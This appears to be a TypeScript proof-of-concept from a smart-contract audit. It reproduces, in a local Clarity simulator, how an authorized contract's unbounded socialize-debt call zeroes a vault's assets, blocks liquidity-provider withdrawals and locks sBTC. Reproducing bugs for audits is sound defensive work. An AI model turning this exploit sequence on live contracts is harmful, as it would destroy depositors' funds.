/**
 * PoC: Audit Finding 1 — socialize-debt forces unbounded LP loss.
 *
 * Reproduces, in an isolated Clarity VM (no mainnet, no network), that a single
 * `authorized-contracts` member can call `socialize-debt` with an unbounded
 * `scaled-amount` and drive the vault's `assets` to 0 — annihilating all LP
 * redemption value while the sBTC physically stays locked in the contract.
 *
 * Stack: @stacks/clarinet-sdk (wasm Clarity VM) + @secondlayer/stacks/clarity (Cl).
 * Run:   bun run simnet/poc/finding-1.ts   (from apps/audit-sentinel)
 */
import { initSimnet } from "@stacks/clarinet-sdk";
import { Cl } from "@secondlayer/stacks/clarity";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const simnetRoot = join(here, "..");

// ---- tiny assertion + formatting helpers -----------------------------------
let checks = 0;
const ok = (cond: boolean, msg: string) => {
  checks++;
  if (!cond) throw new Error(`ASSERTION FAILED: ${msg}`);
  console.log(`  ✓ ${msg}`);
};
const uintOf = (cv: any): bigint => {
  const v = cv?.type === "ok" ? cv.value : cv;
  if (v?.type !== "uint") throw new Error(`expected uint, got ${JSON.stringify(cv)}`);
  return v.value as bigint;
};
const isErr = (cv: any, code: bigint) =>
  cv?.type === "err" && cv.value?.type === "uint" && cv.value.value === code;

async function main() {
  const simnet = await initSimnet(join(simnetRoot, "Clarinet.toml"));
  simnet.setEpoch("3.0"); // enable Clarity 3 contract deployment

  const deployer = simnet.deployer;
  const accounts = simnet.getAccounts();
  const lp = accounts.get("wallet_1")!; // honest liquidity provider
  const controller = accounts.get("wallet_2")!; // legit (authorized) borrow controller
  const evil = accounts.get("wallet_3")!; // compromised / malicious authorized contract

  // ---- deploy: mock sBTC, then the reduced vault --------------------------
  const token = readFileSync(join(simnetRoot, "contracts/sbtc-token.clar"), "utf8");
  const vault = readFileSync(join(simnetRoot, "contracts/vault.clar"), "utf8");
  simnet.deployContract("sbtc-token", token, { clarityVersion: 3 }, deployer);
  simnet.deployContract("vault", vault, { clarityVersion: 3 }, deployer);

  const pub = (fn: string, args: any[], sender: string) =>
    simnet.callPublicFn("vault", fn, args, sender).result;
  const ro = (fn: string, args: any[]) => simnet.callReadOnlyFn("vault", fn, args, deployer).result;
  const mint = (amt: bigint, who: string) =>
    simnet.callPublicFn("sbtc-token", "mint", [Cl.uint(amt), Cl.principal(who)], deployer).result;
  const sbtcBal = (who: string) =>
    uintOf(simnet.callReadOnlyFn("sbtc-token", "get-balance", [Cl.principal(who)], deployer).result);

  const CAP = 100_000_000_000_000n; // 1e14
  const A = 100_000_000n; // LP deposits 1.0 sBTC (1e8 sats)
  const B = 50_000_000n; // borrow controller draws 0.5 sBTC as debt
  const vaultId = `${deployer}.vault`;

  console.log("\n=== SETUP ===");
  mint(MINIMUM(), deployer); // seed deployer for initialize()'s MINIMUM-LIQUIDITY
  mint(A, lp);
  ok(pub("set-cap-supply", [Cl.uint(CAP)], deployer).type === "ok", "dao set-cap-supply");
  ok(pub("set-cap-debt", [Cl.uint(CAP)], deployer).type === "ok", "dao set-cap-debt");
  ok(pub("set-fee-reserve", [Cl.uint(1000n)], deployer).type === "ok", "dao set-fee-reserve (10%)");
  ok(pub("initialize", [], deployer).type === "ok", "vault initialized (MINIMUM-LIQUIDITY seeded)");
  ok(uintOf(pub("deposit", [Cl.uint(A), Cl.uint(0n), Cl.principal(lp)], lp)) === A, "LP deposits 1.0 sBTC -> A shares");

  // create active lending state (precondition for the bug)
  ok(pub("set-authorized-contract", [Cl.principal(controller), Cl.bool(true)], deployer).type === "ok", "dao authorizes borrow controller");
  ok(pub("system-borrow", [Cl.uint(B), Cl.principal(controller)], controller).type === "ok", "controller borrows 0.5 sBTC (debt now active)");
  const psBefore = uintOf(ro("get-principal-scaled", []));

  console.log("\n=== PRE-ATTACK STATE (healthy vault) ===");
  const taBefore = uintOf(ro("get-total-assets", []));
  const lpRedeemable = uintOf(ro("convert-to-assets", [Cl.uint(A)]));
  const lpShares = uintOf(ro("get-balance", [Cl.principal(lp)]));
  console.log(`  total-assets=${taBefore}  LP shares=${lpShares}  LP redeemable=${lpRedeemable}  vault sBTC=${sbtcBal(vaultId)}`);
  ok(taBefore > 0n, "vault has assets");
  ok(lpRedeemable === A, "LP can redeem ~1.0 sBTC (full value)");

  console.log("\n=== ATTACK: one authorized contract calls socialize-debt ===");
  ok(pub("set-authorized-contract", [Cl.principal(evil), Cl.bool(true)], deployer).type === "ok", "dao authorizes EVIL contract");
  const scaled = psBefore * 1_000_000n; // unbounded: no bad-debt precondition, no cap
  console.log(`  EVIL calls (socialize-debt u${scaled})  [principal-scaled was ${psBefore}]`);
  ok(pub("socialize-debt", [Cl.uint(scaled)], evil).type === "ok", "socialize-debt SUCCEEDS (no revert, no precondition)");

  console.log("\n=== POST-ATTACK STATE (LP value destroyed) ===");
  const taAfter = uintOf(ro("get-total-assets", []));
  const lpRedeemableAfter = uintOf(ro("convert-to-assets", [Cl.uint(A)]));
  console.log(`  total-assets=${taAfter}  assets=${uintOf(ro("get-assets", []))}  principal-scaled=${uintOf(ro("get-principal-scaled", []))}  lindex=${uintOf(ro("get-lindex", []))}`);
  console.log(`  LP redeemable=${lpRedeemableAfter}  vault still physically holds sBTC=${sbtcBal(vaultId)}`);
  ok(taAfter === 0n, "total-assets driven to ZERO");
  ok(lpRedeemableAfter === 0n, "LP redeemable value is now ZERO");

  console.log("\n=== PROOF: LP withdrawal is bricked, funds locked ===");
  const redeemRes = pub("redeem", [Cl.uint(A), Cl.uint(0n), Cl.principal(lp)], lp);
  ok(isErr(redeemRes, 801012n), "LP redeem() REVERTS with ERR-OUTPUT-ZERO (u801012)");
  ok(sbtcBal(vaultId) > 0n, `vault still holds ${sbtcBal(vaultId)} sats that no LP can ever withdraw`);

  console.log(`\n✅ FINDING 1 REPRODUCED — ${checks} assertions passed.`);
  console.log("   One authorized-contract call destroyed 100% of LP redemption value;");
  console.log(`   ${sbtcBal(vaultId)} sats of sBTC are now permanently locked in the vault.\n`);
}

// MINIMUM-LIQUIDITY constant mirrored from the contract
function MINIMUM(): bigint {
  return 1000n;
}

main().catch((e) => {
  console.error("\n❌ PoC FAILED:\n", e);
  process.exit(1);
});
